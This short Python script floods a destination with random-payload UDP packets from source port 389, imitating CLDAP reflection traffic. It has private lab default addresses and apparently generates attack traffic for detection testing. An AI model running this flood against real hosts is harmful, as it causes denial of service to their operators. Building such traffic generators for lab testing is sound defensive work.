import socket, time, os, random
DST = os.environ.get("DST", "192.168.77.1"); DUR = float(os.environ.get("DUR", "12"))
SIZE = int(os.environ.get("SIZE", "1400")); SRC = os.environ.get("SRC", "192.168.77.2")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
except OSError:
    pass
s.bind((SRC, 389))                                  # source port 389 = CLDAP reflection signature
payload = bytes(random.getrandbits(8) for _ in range(SIZE))
end = time.time() + DUR; n = 0
while time.time() < end:
    try:
        s.sendto(payload, (DST, random.randint(1024, 65535))); n += 1
    except OSError:
        pass
print("ATTACK_SENT", n, "packets", f"~{n/DUR:,.0f} pps")
